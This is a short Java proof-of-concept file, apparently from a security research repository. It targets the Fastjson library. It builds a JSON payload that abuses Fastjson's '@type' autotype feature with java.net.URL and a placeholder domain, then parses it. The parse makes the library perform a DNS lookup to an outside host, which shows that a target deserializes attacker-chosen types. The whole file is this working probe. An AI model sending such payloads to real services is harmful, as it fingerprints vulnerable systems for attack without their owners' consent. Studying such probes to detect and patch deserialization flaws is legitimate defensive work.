package com.threedr3am.bug.fastjson.dns;

import com.alibaba.fastjson.JSON;

/**
 * @author threedr3am
 */
public class URLPoc {

    public static void main(String[] args) {
        String payload = "{{\"@type\":\"java.net.URL\",\"val\":\"http://xxx.dns\"}:\"aaa\"}";
        try {
            JSON.parse(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
